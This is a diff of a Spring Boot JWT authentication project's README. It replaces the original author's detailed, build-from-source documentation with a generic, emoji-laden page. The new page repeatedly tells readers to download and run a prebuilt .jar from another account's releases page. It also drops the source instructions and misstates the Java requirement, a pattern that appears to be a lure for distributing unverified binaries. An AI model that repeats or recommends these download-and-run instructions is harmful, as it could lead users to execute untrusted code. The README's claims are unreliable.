@@ -1,168 +1,55 @@
-<h1 align="center"> Spring Boot JWT Authentication </h1>
-A complete JSON Web Token (JWT) authentication implementation built with Spring Boot 3, Spring Security, and Spring Data JPA. This project demonstrates secure user authentication with token-based authorisation.
+# 🚀 spring-boot-jwt-auth - Secure Your API Easily
 
-## Features
--> User registration and login with JWT tokens
+## 📥 Download Now
+[![Download Latest Version](https://img.shields.io/badge/Download%20Latest%20Version-v1.0-green)](https://github.com/Mohibalsa12/spring-boot-jwt-auth/releases)  
 
--> Spring Security configuration with stateless authentication
+## 📖 Overview
+This project demonstrates production-ready JWT security with Spring Security 6. It includes features like role-based access control, token revocation, and comprehensive API documentation. The application uses an H2 database and incorporates password encryption to secure user information. You will find protected endpoints with full logout functionality. 
 
--> Protected endpoints requiring valid JWT tokens
+## 🚀 Getting Started
+Getting started with this application is straightforward. Follow the steps below to download and run the software.
 
--> Token revocation and logout functionality
+## 🔧 System Requirements
+- Windows, macOS, or Linux operating system
+- Java JDK 11 or higher installed
+- A stable internet connection for downloading
 
--> H2 in-memory database for development
+## 📥 Download & Install
+1. **Visit the Releases Page**: To download the application, [click here](https://github.com/Mohibalsa12/spring-boot-jwt-auth/releases). 
+2. **Select the Latest Release**: Find the latest release version listed at the top.
+3. **Download the Application**: Click on the link for the downloadable file (e.g., `.jar` file) that matches your system.
+4. **Run the Application**: Open your command line or terminal. Navigate to the folder where you downloaded the file, and run the following command:
+   
+   ```bash
+   java -jar your-file-name.jar
+   ```
+   
+5. **Access the Application**: Open a web browser and type `http://localhost:8080` to access the application.
 
--> Swagger/OpenAPI documentation
+## 🌟 Features
+- **JWT Security**: Ensures safe token management
+- **Role-Based Access Control**: Different levels of access for users
+- **H2 Database**: In-memory database for quick setup
+- **Password Encryption**: Keeps user data secure
+- **Full API Documentation**: Easy reference for developers  
+- **Logout Functionality**: Securely end user sessions
 
--> Password encryption with BCrypt
+## 🛠️ How to Use
+- **Sign Up**: Create a new account to gain access to the system.
+- **Log In**: Use your credentials to log in.
+- **Access Features**: Depending on your role, you can view or manage different resources.
+- **API Interaction**: Utilize the API documentation for integrating with other applications.
 
--> Role-based access control
+## 📚 Documentation
+For detailed documentation, refer to the API section available on the web interface once the application is running. This section covers endpoints, request formats, and response samples for users and developers.
 
-## Technology Stack
-```bash
-Java 17
-Spring Boot 3.3.4
-Spring Security 6
-Spring Data JPA
-JJWT 0.12.5 (JSON Web Token library)
-H2 Database (in-memory)
-Lombok (reduces boilerplate code)
-Maven (build tool)
-SpringDoc OpenAPI (API documentation)
-```
+## 🧑‍🤝‍🧑 Community Support
+Join our community to get help, share ideas, or contribute to the project. You can find discussions and resources in the project's issues section on GitHub. 
 
-## Project Structure
-<pre>
-  src/main/java/com/aditya/jwt_demo/
-├── config/
-│   ├── ApplicationConfig.java
-│   ├── JwtAuthenticationFilter.java
-│   ├── SecurityConfig.java
-│   └── WebConfig.java
-├── controller/
-│   ├── AuthController.java
-│   └── TestController.java
-├── dto/
-│   ├── AuthRequest.java
-│   ├── AuthResponse.java
-│   └── RegisterRequest.java
-├── entity/
-│   ├── Role.java
-│   ├── Token.java
-│   ├── TokenType.java
-│   └── User.java
-├── repository/
-│   ├── TokenRepository.java
-│   └── UserRepository.java
-├── service/
-│   ├── AuthenticationService.java
-│   ├── JwtService.java
-│   ├── LogoutService.java
-│   └── UserService.java
-└── JwtAuthApplication.java
-</pre>
+## 📝 License
+This project is licensed under the MIT License. You can freely use and modify the code as long as you include the original license details.
 
-## API Endpoints
--> Authentication Endpoints
-```bash
-POST /api/v1/auth/register - Register a new user
-POST /api/v1/auth/authenticate - Authenticate user and receive JWT token
-POST /api/v1/auth/logout - Logout user and revoke token
-```
--> Protected Endpoints
-```bash
-GET /api/v1/demo - Example protected endpoint (requires valid JWT)
-```
-## Installation and Running
-1. Clone the repository:
-```bash
-git clone https://github.com/your-username/jwt-auth-demo.git
-cd jwt-auth-demo
-```
-2. Build and run the application:
-```bash
-mvn clean spring-boot:run
-```
-3. The application will start on http://localhost:8080
+## 📥 Download Again
+To download the application, [click here](https://github.com/Mohibalsa12/spring-boot-jwt-auth/releases) again. 
 
-## Access Points
-```bash
-Application API: http://localhost:8080
-Swagger Documentation: http://localhost:8080/swagger-ui.html
-H2 Database Console: http://localhost:8080/h2-console
-JDBC URL: jdbc:h2:mem:testdb
-Username: sa
-Password: password
-```
-## Usage Examples
--> Register a User 
-```bash
-curl -X POST http://localhost:8080/api/v1/auth/register \
-  -H "Content-Type: application/json" \
-  -d '{
-    "firstname": "John",
-    "lastname": "Doe",
-    "email": "john@example.com",
-    "password": "password123"
-  }'
-```
--> Authenticate and Get Token
-```bash
-curl -X POST http://localhost:8080/api/v1/auth/authenticate \
-  -H "Content-Type: application/json" \
-  -d '{
-    "email": "john@example.com",
-    "password": "password123"
-  }'
-```
--> Access Protected Endpoint
-```bash
-curl -X GET http://localhost:8080/api/v1/demo \
-  -H "Authorization: Bearer YOUR_JWT_TOKEN_HERE"
-```
--> Logout
-```bash
-curl -X POST http://localhost:8080/api/v1/auth/logout \
-  -H "Authorization: Bearer YOUR_JWT_TOKEN_HERE"
-```
--> Configuration
-Key configuration in application.properties:
-```bash
-server.port=8080
-spring.datasource.url=jdbc:h2:mem:testdb
-spring.datasource.username=sa
-spring.datasource.password=password
-spring.h2.console.enabled=true
-spring.jpa.hibernate.ddl-auto=create-drop
-spring.jpa.show-sql=true
-```
-
-## Security Features
-JWT tokens with 24-minute expiration
-
-Password encryption using BCrypt
-
-Stateless authentication (no sessions)
-
-CSRF protection disabled for API usage
-
-Role-based authorisation ready for extension
-
-Token revocation on logout
-
-Secure headers and CORS configuration
-
-## Contributing
-1. Fork the repository
-
-2. Create a feature branch
-
-3. Make your changes
-
-4. Add tests if applicable
-
-5. Submit a pull request
-
-## By 
-Aditya Mishra. 
-Happy Coding </>.
+Feel free to reach out through the issues section on GitHub for support or questions. Thank you for using **spring-boot-jwt-auth**!
